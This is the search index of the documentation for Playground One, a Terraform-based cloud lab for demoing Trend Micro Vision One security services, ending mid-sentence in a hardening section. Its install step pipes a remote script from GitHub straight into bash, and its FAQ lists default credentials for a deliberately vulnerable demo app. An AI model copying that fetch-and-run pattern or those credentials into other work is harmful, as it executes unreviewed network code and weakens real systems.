{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Playground One","text":"<p>Success</p> <p>Hello dear Playground One fan. Nice that you found the documentation.</p> <p>Ultra fast and slim playground in the clouds designed for educational and demoing purposes.</p> <p>Abstract</p> <p>Playground Ones main purpose is to act as a learning platform and demo environment while ensuring a reproducible experience. Playground One itself is containerized and uses Terraform to manage the cloud lifecycle using an easy-to-use command line interface. It integrates with various services such as container clusters, virtual instances, storage, but also with the corresponding Vision One services and endpoints. Among other things, you can gain experience and present Vision One Container Security, File Security, XDR, ASRM, Operations, Server &amp; Workload Protection, and APIs in real environments.</p> <p>Playground One includes scenarios and walkthroughs to help you expand your knowledge of cloud security. So if you've ever wanted to experiment with ECS security, run container image scans with GitHub Actions, use EKS with Fargate, do some nasty things, or drive successful demos, go and play with Playground One.</p> <p>In a nutshell:</p> <ul> <li>Bootstrapping directly from the clouds.</li> </ul> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/get_pgoc.sh | bash\n</code></pre> <ul> <li>Playground One is containerized and supports any <code>arm64</code>  or <code>amd64</code> based container engine.</li> <li>Alternatively, you can install natively on your system.</li> <li>Management of the environment with the help of an easy to use command line interface <code>pgo</code>.</li> <li>Based on Terraform &gt;1.6</li> </ul> <p>Under construction!</p> <p>The Playground One is continuously under construction! The capabilities and contents are therefore to be enjoyed with caution and can change at any time.</p>"},{"location":"#requirements","title":"Requirements","text":"<p>The Playground One is designed to work on these platforms:</p> <p>Playground One Container:</p> <ul> <li>Container engine hosted either on <code>arm64</code> or <code>amd64</code>.</li> <li>Tested with Docker and Colima on Ubuntu, Cloud9, MacOS Intel and Apple Silicon.</li> </ul> <p>Playground One native installation:</p> <ul> <li>Ubuntu Bionic and newer.</li> <li>Intel and M1+ MacOS.</li> </ul>"},{"location":"#system-health","title":"System Health","text":""},{"location":"#aws","title":"AWS","text":"Component Operational Known Issues Vision One Network Yes See 1) Service GatewayIdentity SecurityVirtual Network SensorDeep Discovery Inspector Instances Yes None Server &amp; Workload ProtectionASRMService GatewayIdentity SecurityVirtual Network SensorDeep Discovery Inspector EKS EC2 Yes None Container SecurityOAT&amp;WB GenerationTerraform ProviderKSPM EKS Fargate Yes None Container SecurityOAT&amp;WB GenerationTerraform ProviderKSPM ECS EC2 Yes See 2) Container Security ECS Fargate Yes See 3) Container Security Bucket Scanner Yes FSS SDK Scenarios CloudTrail Yes CloudTrail Scenarios CSPM Yes CSPM Scenarios Identity Yes Identity Security Scenarios Zero Trust Yes Zero TrustPrivate Access Gateway Deep Security Yes None Deep Security Integration &amp; MigrationXDRServer &amp; Workload Protection Workload Security Yes None Workload Security Integration &amp; MigrationXDRServer &amp; Workload Protection <p>1) In addition to the network itself the following services can be enabled: Active Directory, AWS Managed Active Directory, Service Gateway, Virtual Network Sensor, and Deep Discovery Inspector. The Active Directories are pretty basic but support SSL. They will support additional scenarios with Identity Security, Data Security, and more.</p> <p>2) Deleting the cluster requires the deactivation runtime scanning and runtime security before destroying the cluster. If destroy process <code>module.ecs-ec2[0].module.ecs_service.aws_ecs_service.this[0]: Still destroying...</code> hangs for a couple of minutes manually terminate the autoscaling group <code>pgo4-ecs-ec2-asg-spot-...</code> in AWS.</p> <p>3) Activating Runtime Security requires some manual steps, see documentation. Deleting the cluster requires the deactivation of runtime scanning and runtime security before destroying the cluster. Newly created task definitions must be removed manually.</p>"},{"location":"#azure","title":"Azure","text":"Component Operational Known Issues Vision One Cloud Security AKS Yes None Container Security"},{"location":"#other","title":"Other","text":"Component Operational Known Issues Vision One Cloud Security TMAS Yes None Artifact Scanning for Vulnerabilities and Malware TMFS Yes None File and Directory Scanning for Malware Kind Kubernetes Yes Only native"},{"location":"#cli-commands-of-the-playground","title":"CLI Commands of the Playground","text":"<p>Besides the obvious cli tools like <code>kubectl</code>, etc. the Playground offers you additional commands shown in the table below (and more):</p> Area Command Function PGO pgo The command line interface for Playground One. PGO pgoc Starts, stops or updates the Playground One Container. PGO pgos Starts a new bash with AWS credentials of PGO User. PGO dsm Start or stop a deployed Deep Security. Kubernetes kubie See github.com/sbstp/kubie. Kubernetes stern Tail logs from multiple pods simultaneously. Kubernetes k9s See k9scli.io. Kubernetes k8s-ns-finalizer Removes finalizer from namespace. Helpful when a namespace cannot be destroyed. Kubernetes k8s-list-images Lists and counts all unique images by namespace currently in use. Vision One tmcli-update Update TMAS and TMFS to the latest version. Vision One ecsfg-add-v1cs Patches ECS Fargate Task to activate Container Security. Vision One collect-logs Collects logs and configuration of Container Security. Usage: <code>RELEASE=container-security collect-logs</code>. AWS aws-cleanup-policies Removes unattached policies of your PGO environment. Vulnerabilities syft See github.com/anchore/syft. Vulnerabilities grype See github.com/anchore/grype."},{"location":"#change-log","title":"Change Log","text":"<p>0.4.7</p> <p>Changes</p> <ul> <li>New integration: Deep Discovery Inspector</li> </ul> <p>0.4.6</p> <p>Changes</p> <ul> <li>New scenario: Zero Trust Access - Lab</li> </ul> <p>0.4.5</p> <p>Changes</p> <ul> <li>Kind cluster now uses Terraform Provider for Container Security</li> </ul> <p>0.4.4</p> <p>Changes</p> <ul> <li>Update FSS SDK and improve Bucket Scanner Lambda sample</li> </ul> <p>0.4.3</p> <p>Fixes</p> <ul> <li>Fix <code>pgoc</code> on arm64</li> <li>Update documentation for PGO user initial setup</li> <li>Update default <code>group_id</code> for Container Security on EKS clusters</li> </ul> <p>0.4.2</p> <p>Changes</p> <ul> <li>Added support for Vision One Virtual Network Sensor. If enabled the Virtual Network Sensor is deployed into the PGO VPC. The PGO Active Directory and PGO instances will mirror their traffic to the data port of VNS. Requires the VNS Token from Vision One UI.</li> <li>Added support for Istio on EKS EC2.</li> <li>New Scenarios:</li> <li><code>XDR -&gt; Detection Model Exceptions for Container Security</code>.</li> <li><code>Endpoint Security -&gt; Deep Security -&gt; Integrate Deep Security with Vision One and Demo Benefits</code>.</li> <li><code>Cloud Security -&gt; Container Security -&gt; EKS -&gt; Playing with Istio Service Mesh</code>.</li> <li>You can now choose the OS SKU for the nodes in the AKS Cluster. It defaults to <code>AzureLinux</code>.</li> <li>The EKS cluster deployment of V1 Container Security now supports <code>group_id</code> using the Terraform Provider.</li> <li>The <code>pgo</code> command now checks if your local IP has changed and needs and update.</li> </ul> <p>0.4.1</p> <p>Changes</p> <ul> <li>AWS ECS configurations are now split into two separate configurations <code>ecs-ec2</code> and <code>ecs-fg</code>. This simplifies the deployment and now works the same way as AWS EKS.</li> <li>All Terraform Modules and Providers are now version fixed.</li> <li>Improved Naming of instances in regards to the PGO Active Directory</li> <li><code>pgo --config</code> does now allow to disable initialization of Terraform after a first run. This speeds up configuration changes dramatically.</li> <li>Playground One can optionally use its own AWS user with limited privileges. The user can be created by running <code>pgo --apply user</code>, which of course requires administrative privileges with your own AWS user. You have to enable the PGO user in the configuration, but you can disable it at any time.</li> <li>Migrated EKS cluster deployments to use the Vision One Terraform Provider. </li> <li>There are new scenarios available:</li> <li>Deploy Service Gateway on AWS manually</li> <li>Deploy Service Gateway on AWS automatically</li> <li>Integrate an Active Directory via Service Gateway on AWS</li> <li>New Scenario section: Workflow and Automation - Third-Party Integration:</li> <li>Setup Splunk</li> <li>Integrate Splunk with Vision One XDR</li> <li>Integrate V1CS Customer Runtime Security Rules with Splunk</li> <li>Setup Elastic Stack</li> <li>Integrate Elastic Stack with Vision One</li> <li>XDR Threat Investigation: CloudTrail</li> <li>Identity Posture: Populate the Active Directory</li> </ul> <p>0.3.3</p> <p>New</p> <ul> <li>The network configuration can now optionally create an Active Directory (the PGO-style) within the VPC. Plan is to support Identity Security scenarios in the future. This is cheaper than the AWS Managed Active Directory.</li> </ul> <p>0.3.2</p> <p>New</p> <ul> <li>The network configuration can now optionally create an AWS Managed Active Directory within the VPC. Plan is to support Identity Security scenarios in the future.</li> <li>The same configuration can now optionally deploy a Vision One Service Gateway to the public subnet.</li> </ul> <p>Fixes</p> <ul> <li>The deployment of Vision Container Security did use an incorrect API call when creating the cluster. Instead of <code>resourceId</code> the key <code>arn</code> from the old beta API was used.</li> </ul> <p>0.3.1</p> <p>New</p> <ul> <li>Cloud One Conformity Exception Workflows inspired by customer</li> <li>New Scenario section: Big Data<ul> <li>Setup Splunk</li> <li>Integrate Vision One with Splunk</li> <li>Integrate V1CS Customer Runtime Security Rules with Splunk</li> </ul> </li> </ul> <p>Changes</p> <ul> <li>Kind cluster now supports Workbench and OAT generation</li> </ul> <p>0.3.0</p> <p>Changes</p> <ul> <li>Migrated V1CS api to v3.0.</li> </ul> <p>0.2.9</p> <p>Changes</p> <ul> <li>Bump EKS module to version 20.8.5</li> <li>Reworked IAM for EKS-EC2 to not use am AWS admin account. Proper access permissions implemented. Minor IAM changes in EKS-FG.</li> </ul> <p>0.2.8 (04/19/2024)</p> <p>Fixes</p> <ul> <li>Resize file system now detects root volume device name.</li> </ul> <p>0.2.7 (04/04/2024)</p> <p>Fixes</p> <ul> <li>Fix in pgo cli to support Vision One Regions.</li> <li>Azure App Gateway functional with Java-Goof app of scenarios.</li> </ul> <p>0.2.6 (04/03/2024)</p> <p>Fixes</p> <ul> <li>Various fixes and compatibility changes for Product Experience and Deep Security Migration Scenario.</li> <li>Playground One now supports all Vision One Regions when interacting with the REST API.</li> <li>App Gateway now functional on AKS cluster. Ingress for Scenarios to be done.</li> </ul> <p>Changes</p> <ul> <li>Bump version of DSM to 20.0.893</li> </ul> <p>0.2.5 (03/21/2024)</p> <p>Playground One is now included in Trend Micro Product Experience.</p> <p>Changes</p> <ul> <li>Enabled EC2 Instance Connect via Console to EC2 instances for some regions. See FAQ.</li> <li>Playground One is now able to run on Trend Micro Platform Experience. Ensure to enable it in the configuration.</li> <li>Deep Security now has SOAP API enabled.</li> <li>Upgraded Deep Security Manager and Agents to versions as of 03/18/2023.</li> <li>Added dryrun capability for apply and destroy in CLI.</li> </ul> <p>0.2.4 (03/13/2024)</p> <p>Changes</p> <ul> <li>The preparation for potential attack path detections with ASRM can now be enabled or disabled via the config tool.</li> <li>IAM User Potential Attack Path with a new scenario.</li> </ul> <p>0.2.3 Fix release (03/08/2024)</p> <p>Fixes</p> <ul> <li>Corrected lock handling on network.</li> </ul> <p>0.2.2 (03/07/2024)</p> <p>Fixes</p> <ul> <li><code>ecsfg-add-v1cs</code> does now work within the Playground One Container.</li> </ul> <p>Changes</p> <ul> <li>AWS and Azure now use the same environment name.</li> <li>Local Kind cluster now supports load balancing and ingress controller based on Contour-Envoy.</li> </ul> <p>0.2.1 Fix release (02/27/2024)</p> <p>Fixes</p> <ul> <li>The implementation of a proper Vision One Container Security life-cycle broke the deployment since the DELETE api_call was fired too early.</li> </ul> <p>Changes</p> <ul> <li>Simple S3 Bucket scanner now part of Playground One. This includes a dedicated scenario.</li> <li>Improved handling of public IPs in configflow when running on Cloud9.</li> <li>Any existing Azure credentials will now be made available within the container.</li> </ul> <p>0.2 Maintenance release (02/20/2024)</p> <p>Fixes</p> <ul> <li>Vision One Container Security gets unregistered from Vision One on cluster destroy.</li> <li>Cluster deployments are now correctly destroyed in the correct order.</li> <li>Allow docker client to work with docker.sock on Cloud9</li> </ul> <p>Changes</p> <ul> <li>Playground One Container now supports versioning.</li> <li>ECS Fargate task definition patcher bumped to version 2.3.30</li> <li>New scenario added: Container Image Vulnerability and Malware Scanning as GitHub Action.</li> <li>Removed openssl3 demo app.</li> </ul> <p>0.1 Initial release (02/06/2024)</p>"},{"location":"#support","title":"Support","text":"<p>This is an Open Source community project. Project contributors may be able to help, depending on their time and availability. Please be specific about what you're trying to do, your system, and steps to reproduce the problem.</p> <p>For bug reports or feature requests, please open an issue. You are welcome to contribute.</p> <p>Official support from Trend Micro is not available. Individual contributors may be Trend Micro employees, but are not official support.</p>"},{"location":"#contribute","title":"Contribute","text":"<p>I do accept contributions from the community. To submit changes:</p> <ol> <li>Fork this repository.</li> <li>Create a new feature branch.</li> <li>Make your changes.</li> <li>Submit a pull request with an explanation of your changes or additions.</li> </ol> <p>I will review and work with you to release the code.</p>"},{"location":"bloopers/","title":"Bloopers during development","text":""},{"location":"bloopers/#terraform","title":"Terraform","text":""},{"location":"bloopers/#delete-all-resources-except-one","title":"Delete all resources except one","text":"<p>There is no --except feature in terraform destroy command currently. If you really want to do that, and you know what you are doing, here is the workaround.</p> <pre><code># list all resources\nterraform state list\n\n# remove that resource you don't want to destroy\n# you can add more to be excluded if required\nterraform state rm &lt;resource_to_be_deleted&gt; \n\n# destroy the whole stack except above excluded resource(s)\nterraform destroy \n</code></pre> <p>So why do these commands work for your idea?</p> <p>The state (*.tfstate) is used by Terraform to map real world resources to your configuration, keep track of metadata.</p> <p>terraform state rm cleans a record (resource) from the state file (*.tfstate) only. It doesn't destroy the real resource.</p> <p>Since you don't run terraform apply or terraform refresh, after terraform state rm, terraform doesn't know the excluded resource was created at all.</p> <p>When you run terraform destroy, it has no detail about that excluded resource\u2019s state and will not destroy it. It will destroy the rest.</p> <p>By the way, later you still have chance to import the resource back with terraform import command if you want.</p> <pre><code>terraform import module.vpc.aws_vpc.vpc vpc-0933149e01f1136aa\n</code></pre>"},{"location":"bloopers/#ecs-cluster-with-capacity-providers-cannot-be-destroyed","title":"ECS cluster with capacity providers cannot be destroyed","text":"<p>The problem is that the capacity_provider property on the aws_ecs_cluster introduces a new dependency: aws_ecs_cluster depends on aws_ecs_capacity_provider depends on aws_autoscaling_group.</p> <p>This causes terraform to destroy the ECS cluster before the autoscaling group, which is the wrong way around: the autoscaling group must be destroyed first because the cluster must contain zero instances before it can be destroyed.</p> <p>This leads to Terraform error out with the cluster partly alive and the capacity providers fully alive.</p> <p>References:</p> <ul> <li>https://github.com/hashicorp/terraform-provider-aws/issues/4852</li> <li>https://github.com/hashicorp/terraform-provider-aws/issues/11409</li> <li>https://github.com/hashicorp/terraform-provider-aws/pull/22672</li> </ul> <p>I haven't found a proper workaround, yet...</p>"},{"location":"bloopers/#eks","title":"EKS","text":""},{"location":"bloopers/#unable-to-delete-ingress","title":"Unable to delete ingress","text":"<pre><code>kubectl delete ValidatingWebhookConfiguration aws-load-balancer-webhook\nkubectl patch ingress $ingressname -n $namespace -p '{\"metadata\":{\"finalizers\":[]}}' --type=merge\n</code></pre>"},{"location":"bloopers/#unable-to-delete-namespace","title":"Unable to delete namespace","text":"<p>To delete a namespace, Kubernetes must first delete all the resources in the namespace. Then, it must check registered API services for the status. A namespace gets stuck in Terminating status for the following reasons:</p> <ul> <li>The namespace contains resources that Kubernetes can't delete.</li> <li>An API service has a False status.</li> </ul> <p>Scripted:</p> <pre><code>k8s-ns-finalizer &lt;NAMESPACE&gt;\n</code></pre> <p>Manual:</p> <ol> <li>Save a JSON file like in the following example:</li> </ol> <pre><code>namespace=&lt;NAMESPACE&gt;\n\nkubectl get namespace $namespace -o json &gt; tempfile.json\n</code></pre> <ol> <li>Remove the finalizers array block from the spec section of the JSON file:</li> </ol> <pre><code>\"spec\": {\n        \"finalizers\": [\n            \"kubernetes\"\n        ]\n    }\n</code></pre> <p>After you remove the finalizers array block, the spec section of the JSON file looks like this:</p> <pre><code>\"spec\" : {\n    }\n</code></pre> <ol> <li>To apply the changes, run the following command:</li> </ol> <pre><code>kubectl replace --raw \"/api/v1/namespaces/$namespace/finalize\" -f ./tempfile.json\n</code></pre> <ol> <li>Verify that the terminating namespace is removed:</li> </ol> <pre><code>kubectl get namespaces\n</code></pre> <p>Repeat these steps for any remaining namespaces that are stuck in the Terminating status.</p>"},{"location":"bloopers/#eksworkernode-is-not-joining-node-group","title":"EKSWorkerNode is not joining Node Group","text":"<p>This does help to identify the problem:</p> <ul> <li>https://repost.aws/knowledge-center/resolve-eks-node-failures</li> <li>https://docs.aws.amazon.com/systems-manager-automation-runbooks/latest/userguide/automation-awssupport-troubleshooteksworkernode.html</li> <li>https://console.aws.amazon.com/systems-manager/automation/execute/AWSSupport-TroubleshootEKSWorkerNode</li> </ul>"},{"location":"bloopers/#eks-service-behind-alb-shows-only-html","title":"EKS Service behind ALB shows only HTML","text":"<pre><code>resource \"kubernetes_ingress_v1\" \"openssl3_ingress\" {\n  wait_for_load_balancer = true\n\n  metadata {\n    annotations = {\n      \"alb.ingress.kubernetes.io/scheme\"        = \"internet-facing\"\n      \"alb.ingress.kubernetes.io/target-type\"   = \"ip\"\n      \"kubernetes.io/ingress.class\"             = \"alb\"\n      \"alb.ingress.kubernetes.io/inbound-cidrs\" = var.access_ip\n    }\n    labels = {\n      app = \"web-app\"\n    }\n    name      = \"web-app-ingress\"\n    namespace = var.namespace\n  }\n  spec {\n    rule {\n      http {\n        path {\n          backend {\n            service {\n              name = \"web-app-service\"\n              port {\n                number = 80\n              }\n            }\n          }\n          path = \"/*\"\n        }\n      }\n    }\n  }\n}\n</code></pre> <p>The <code>*</code> in <code>path</code> is important :-)</p>"},{"location":"bloopers/#route53","title":"Route53","text":"<p>If a hosted zone is destroyed and re-provisioned, new name server records are associated with the new hosted zone. However, the domain name might still have the previous name server records associated with it.</p> <p>If AWS Route 53 is used as the domain name registrar, head to Route 53 &gt; Registered domains &gt; ${your-domain-name} &gt; Add or edit name servers and add the newly associated name server records from the hosted zone to the registered domain.</p>"},{"location":"bloopers/#xdr-for-containers","title":"XDR for Containers","text":"<p>Initially, I thought I just need to leave the VPC alone when changing/destroying part of the network configuration. This was a failure...</p>"},{"location":"bloopers/#misc-commands-which-helped-at-some-point","title":"Misc commands which helped at some point","text":"<pre><code>aws kms delete-alias --alias-name alias/eks/playground-one-eks\n</code></pre>"},{"location":"bloopers/#eks-ec2-autoscaler","title":"EKS EC2 Autoscaler","text":"<p>In some cases creating the EKS cluster with EC2 instances failes just before finishing with the following error:</p> <pre><code>\u2577\n\u2502 Warning: Helm release \"cluster-autoscaler\" was created but has a failed status. Use the `helm` command to investigate the error, correct it, then run Terraform again.\n\u2502 \n\u2502   with module.eks.helm_release.cluster_autoscaler[0],\n\u2502   on eks-ec2/autoscaler.tf line 25, in resource \"helm_release\" \"cluster_autoscaler\":\n\u2502   25: resource \"helm_release\" \"cluster_autoscaler\" {\n\u2502 \n\u2575\n...\n\u2577\n\u2502 Error: 1 error occurred:\n\u2502       * Internal error occurred: failed calling webhook \"mservice.elbv2.k8s.aws\": failed to call webhook: Post \"https://aws-load-balancer-webhook-service.kube-system.svc:443/mutate-v1-service?timeout=10s\": no endpoints available for service \"aws-load-balancer-webhook-service\"\n\u2502 \n\u2502 \n\u2502 \n\u2502   with module.eks.helm_release.cluster_autoscaler[0],\n\u2502   on eks-ec2/autoscaler.tf line 25, in resource \"helm_release\" \"cluster_autoscaler\":\n\u2502   25: resource \"helm_release\" \"cluster_autoscaler\" {\n\u2502 \n\u2575\n</code></pre> <p>This looks like a timing issue for me which I need to investigate further. If you run into this problem just rerun</p> <pre><code>pgo --apply eks-ec2\n</code></pre> <p>This should complete the cluster creation within seconds then.</p> <p>Autoscaler Logs:</p> <pre><code>kubectl logs -f -n kube-system -l app=cluster-autoscaler\n</code></pre>"},{"location":"faq/","title":"Frequently asked Questions","text":""},{"location":"faq/#how-to-update-the-playgound-one","title":"How to update the Playgound One?","text":"<p>The Playground is under contiuous development. Even if I try to not implement breaking changes please follow the steps below before updating it to the latest version:</p> <pre><code># Destroy your deployments\npgo --destroy all\n\n# Destroy your network\npgo --destroy nw\n\n# Do the update\ncd ${ONEPATH}\ngit pull\n\n# Run config\npgo --config\n</code></pre> <p>If everything went well you should be able to recreate your environment. If you run into trouble please open an issue.</p>"},{"location":"faq/#im-running-the-playground-on-a-cloud9-and-want-to-restrict-access-to-my-home-ip","title":"I'm running the Playground on a Cloud9 and want to restrict access to my home IP","text":"<p>If you work on a Cloud9 you need to take care on two public IP addresses instead of one when having the playground locally. These are the public IP of your own network (where your own computer is located) and the public IP of your Cloud9.</p> <p>Your own IP is required since you likely want to access the applications provided by the Playground One running on EKS, ECS and connect to the EC2 instances.</p> <p>The public IP of the Cloud9 is required to allow your Cloud9 access the EC2 instances while provisioning.</p> <p>For this to work you need to define two <code>Access IPs/CIDRs</code> in the configuration workflow with <code>pgo --configure</code>.</p> <p>Example:</p> <p>Public IP address of your</p> <ul> <li>Cloud 9 instance: <code>3.123.18.11</code> (get it from the EC2 console), and</li> <li>Client at home: <code>87.170.6.193</code></li> </ul> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\n...\nPlease set/update your Playground One configuration\nAccess IPs/CIDRs []: 3.123.18.11, 87.170.6.193\n...\n</code></pre> <p>The above will automatically be converted into the correct CIDRs <code>3.123.18.11/32, 87.170.6.193/32</code></p> <p>To simplify this process you can easily let the config tool determine the Cloud9 public IP address by entering the keyword <code>pub</code>.</p> <pre><code>...\nPlease set/update your Playground One configuration\nAccess IPs/CIDRs []: pub, 87.170.6.193\n...\n</code></pre> <p>Then run</p> <pre><code>pgo --init nw\npgo --apply nw\n</code></pre>"},{"location":"faq/#my-ip-address-has-changed-and-i-cannot-access-my-environment-anymore","title":"My IP address has changed and I cannot access my environment anymore","text":"<p>If you need to change the access IP later on, maybe your provider assigned you a new one, follow these steps:</p> <ol> <li>Run <code>pgo --updateip</code> and set the new IP address as described in Getting Started Configuration</li> <li> <p>Terraform tells you which actions will be performed when approving them. Validate that there will be only one in-place update on the resource <code>module.ec2.aws_security_group.sg[\"public\"]</code>.</p> <pre><code>Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols:\n  ~ update in-place\n\nTerraform will perform the following actions:\n\n  # module.ec2.aws_security_group.sg[\"public\"] will be updated in-place\n  ~ resource \"aws_security_group\" \"sg\" {\n        id                     = \"sg-01e76a72ffd468baa\"\n      ~ ingress                = [\n...\n</code></pre> </li> <li> <p>Approve the actions by entering <code>yes</code>, otherwise press <code>^c</code>.</p> </li> </ol> <p>This should be completed within a minute.</p> <p>If the above didn't work for you and you still need to update the IP(s) you need to run</p> <pre><code>pgo --destroy all\npgo --init all\npgo --apply nw\n</code></pre> <p>Then reapply your eks, ecs, ec2 or scenarios by <code>pgo --apply &lt;configuration&gt;</code>.</p>"},{"location":"faq/#i-restarted-my-cloud9-instance-and-i-cannot-access-my-environment-anymore","title":"I restarted my Cloud9 instance and I cannot access my environment anymore","text":"<p>See above.</p>"},{"location":"faq/#i-cannot-destroy-the-ecs-clusters","title":"I cannot destroy the ECS cluster(s)","text":"<p>If you have enabled <code>Runtime Scanning</code> and/or <code>Runtime Security</code> in your Vision One console for your ECS clusters disable them and press <code>[Save]</code>. Wait for the container security services/tasks disappear on the EC2 console. The clusters should then be successfully destroyed.</p> <p>Background: Vision One injects addisional tasks to the ECS clusters which are not known by the playground. Even if you delete the task in the AWS console they are injected again by Vision One. This causes a remaining dependency on the AWS side which prevents the destruction of ECS.</p> <p>Special case for ECS EC2</p> <p>There's a known bug in Terraform. The problem is that this new capacity_provider property on the aws_ecs_cluster introduces a new dependency: aws_ecs_cluster depends on aws_ecs_capacity_provider depends on aws_autoscaling_group.</p> <p>This causes terraform to destroy the ECS cluster before the autoscaling group, which is the wrong way around: the autoscaling group must be destroyed first because the cluster must contain zero instances before it can be destroyed.</p> <p>This leads to Terraform error out with the cluster partly alive and the capacity providers fully alive.</p> <p>The <code>pgo</code> CLI solves this problem by running <code>aws</code> CLI commands to delete the capacity providers before doing <code>terraform destroy</code>. Not nice but works.</p>"},{"location":"faq/#i-dont-find-the-todolist-app-of-java-goof","title":"I don't find the <code>todolist</code>-app of Java-Goof","text":"<p>To access the <code>todolist</code> application append <code>/todolist</code> to the loadbalancer DNS name in your browser.</p> <p>For authentication use:</p> <ul> <li>Username: <code>foo@bar.org</code></li> <li>Password: <code>foobar</code></li> </ul>"},{"location":"faq/#upgrade-vision-one-container-security-to-the-latest-release","title":"Upgrade Vision One Container Security to the latest Release","text":"<pre><code>helm get values --namespace trendmicro-system container-security | helm upgrade container-security \\\n    --namespace trendmicro-system \\\n    --values - \\\n    https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz\n</code></pre>"},{"location":"faq/#inspect-the-kubernetes-manifest-of-container-security","title":"Inspect the Kubernetes Manifest of Container Security","text":"<p>If you want to inspect the full kubernetes manifest of Container Security deployed on your environment run:</p> <pre><code>helm get values --namespace trendmicro-system container-security | helm template container-security \\\n  --namespace trendmicro-system \\\n  --values - \\\n  https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz &gt; manifest.yaml\n</code></pre>"},{"location":"faq/#aws-ec2-instance-connect-does-not-work-from-the-aws-ec2-console","title":"AWS EC2 Instance Connect does not work from the AWS EC2 Console","text":"<p>EC2 Instance Connect uses specific IP address ranges for browser-based SSH connections to your instance (when users use the Amazon EC2 console to connect to an instance). These IP address ranges are documented here.</p> <p>To filter this large list for instance connect run:</p> <pre><code>jq '.prefixes[] | select(.service==\"EC2_INSTANCE_CONNECT\") | .' ip-ranges.json\n</code></pre> <p>Currently, Playground One does only allow Instance Connect from the following regions:</p> Region IP address range eu-central-1 3.120.181.40/29 eu-west-1 18.202.216.48/29 eu-west-2 3.8.37.24/29 eu-west-3 35.180.112.80/29 eu-north-1 13.48.4.200/30 us-east-1 18.206.107.24/29 us-east-2 3.16.146.0/29 us-west-1 13.52.6.112/29 us-west-2 18.237.140.160/29 <p>If you need any other reagion, please let me know.</p> <p>See:</p> <ul> <li>AWS Documentation</li> <li>AWS IP Ranges</li> </ul>"},{"location":"faq/#know-how-to-check-the-region-and-data-center-location-details-in-trend-vision-one","title":"Know how to check the region and Data Center location details in Trend Vision One","text":"<p>To find out API URLs and datacenter locations, check the Vision One Site URL you are using:</p> Site Vision One Site US https://portal.xdr.trendmicro.com/ EU https://portal.eu.xdr.trendmicro.com/ JP https://portal.jp.xdr.trendmicro.com/ SG https://portal.sg.xdr.trendmicro.com/ AU https://portal.au.xdr.trendmicro.com/ IN https://portal.in.xdr.trendmicro.com/ <p>This takes you to the Region Code and API URL:</p> Site Region Code API URL US us-east-1 https://api.xdr.trendmicro.com EU eu-central-1 https://api.eu.xdr.trendmicro.com JP ap-northeast-1 https://api.xdr.trendmicro.co.jp SG ap-southeast-1 https://api.sg.xdr.trendmicro.com AU ap-southeast-2 https://api.au.xdr.trendmicro.com IN ap-south-1 https://api.in.xdr.trendmicro.com <p>The Data Centers for the locations are then listed below:</p> Site Data Center Name Data Center Location Azure Data Center Location AWS US United States East US - N. Virginia East US - N. Virginia EU Germany West Europe - Netherlands Frankfurt, Germany JP Japan Tokyo, Japan Tokyo, Japan SG Singapore Singapore Singapore AU Australia Australia Central Sidney, Australia IN India Mumbai Mumbai <p>Link: Trend Micro Business Success Portal</p>"},{"location":"security/","title":"Playground One Security","text":""},{"location":"security/#network","title":"Network","text":""},{"location":"security/#eks","title":"EKS","text":""},{"location":"security/#54-cluster-networking","title":"5.4. Cluster Networking","text":"<p>Restrict Access to the Control Plane Endpoint</p> <p>Authorized networks are a way of specifying a restricted range of IP addresses that are permitted to access your cluster's control plane. Kubernetes Engine uses both Transport Layer Security (TLS) and authentication to provide secure access to your cluster's control plane from the public internet. This provides you the flexibility to administer your cluster from anywhere; however, you might want to further restrict access to a set of IP addresses that you control. You can set this restriction by specifying an authorized network.</p> <p>Restricting access to an authorized network can provide additional security benefits for your container cluster, including:</p> <ul> <li>Better protection from outsider attacks: Authorized networks provide an additional layer of security by limiting external access to a specific set of addresses you designate, such as those that originate from your premises. This helps protect access to your cluster in the case of a vulnerability in the cluster's authentication or authorization mechanism.</li> <li>Better protection from insider attacks: Authorized networks help protect your cluster from accidental leaks of master certificates from your company's premises. Leaked certificates used from outside Cloud Services and outside the authorized IP ranges (for example, from addresses outside your company) are still denied access.</li> </ul> <p>By enabling private endpoint access to the Kubernetes API server, all communication between your nodes and the API server stays within your VPC. You can also limit the IP addresses that can access your API server from the internet, or completely disable internet access to the API server.</p> <p>With this in mind, you can update your cluster accordingly using the AWS CLI to ensure that Private Endpoint Access is enabled.</p> <p>If you choose to also enable Public Endpoint Access then you should also configure a list of allowable CIDR blocks, resulting in restricted access from the internet. If you specify no CIDR blocks, then the public API server endpoint is able to receive and process requests from all IP addresses by defaulting to ['0.0.0.0/0'].</p> <p>For example, the following command would enable private access to the Kubernetes API as well as limited public access over the internet from a single IP address (noting the /32 CIDR suffix):</p> <pre><code>aws eks update-cluster-config --region ${aws_region} --name ${cluster_name} --resources-vpc-config endpointPrivateAccess=true, endpointPrivateAccess=true,publicAccessCidrs=\"203.0.113.5/32\"\n</code></pre> <p>Audit - Playground One:</p> <pre><code>cd ${ONEPATH}/awsone/4-cluster-eks-ec2\ncluster_name=$(terraform output -raw cluster_name)\n\necho Cluster private access enpoint enabled:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.endpointPrivateAccess\"\n\necho Cluster public access enpoint enabled:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.endpointPublicAccess\"\n\necho Cluster public access CIDRs:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.publicAccessCidrs\"\n</code></pre> <pre><code># Example\nCluster private access enpoint enabled:\ntrue\nCluster public access enpoint enabled:\ntrue\nCluster public access CIDRs:\n[\n    \"84.190.104.66/32\"\n]\n</code></pre> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>9.3 Maintain and Enforce Network-Based URL Filters Enforce and update network-based URL filters to limit an enterprise asset from 